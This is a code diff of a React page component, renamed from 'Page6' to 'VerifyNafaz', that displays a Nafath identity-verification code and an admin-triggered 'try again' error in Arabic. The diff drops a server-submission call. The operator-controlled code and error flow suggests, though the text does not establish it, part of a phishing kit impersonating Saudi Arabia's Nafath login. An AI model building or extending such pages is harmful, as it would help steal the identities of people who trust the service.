@@ -1,47 +1,21 @@
 import Main from "@/components/Main";
 import { Button } from "@/components/ui/button";
-import { MAIN_BTN } from "@/constants/data";
 import { useSignals } from "@preact/signals-react/runtime";
+import { code, isAdminError } from "@/real-time/context/signals";
+import NafazVerifySteps from "../nafaz/NafazVerifySteps";
 import { useEffect } from "react";
-import {
-  code,
-  currentPage,
-  isAdminError,
-  loading,
-  sendDataToServer,
-} from "../../context/signals";
-import { useLocation, useNavigate } from "react-router-dom";
-import NafazVerifySteps from "@/components/NafazVerifySteps";
+import { setCurrentPage } from "@/real-time/utils/utils";
+import { MAIN_BTN } from "@/constants/data";
 
-function Page6() {
-  const navigate = useNavigate();
-  const { state } = useLocation();
+function VerifyNafaz() {
   useSignals();
-
-  const sendData = () => {
-    sendDataToServer(
-      {},
-      "page6",
-      "final-page",
-      true,
-      navigate,
-      "/final-page",
-      state
-    );
-  };
-
   useEffect(() => {
-    sendData();
-    currentPage.value = "page6";
+    setCurrentPage("verify-nafaz");
   }, []);
-
-  useEffect(() => {
-    code.value ? (loading.value = false) : (loading.value = true);
-  }, [code.value]);
 
   return (
     <Main>
-      <div className="bg-gray-100 min-h-[calc(100vh-400px)] py-20">
+      <div className="bg-gray-100 min-h-screen py-20">
         <div className="flex flex-col gap-2 max-w-lg mx-auto bg-white p-8 rounded-2xl pt-10">
           <img
             src="/assets/images/Nafath.png"
@@ -64,7 +38,10 @@ function Page6() {
               >
                 يبدو أن هناك مشكلة بالمعلومات المدخلة حاول مجدداً !
               </p>
-              <Button className={MAIN_BTN + " text-xs"} onClick={sendData}>
+              <Button
+                className={MAIN_BTN + " text-xs"}
+                onClick={() => window.location.reload()}
+              >
                 اعادة المحاولة
               </Button>
             </>
@@ -88,4 +65,4 @@ function Page6() {
     </Main>
   );
 }
-export default Page6;
+export default VerifyNafaz;
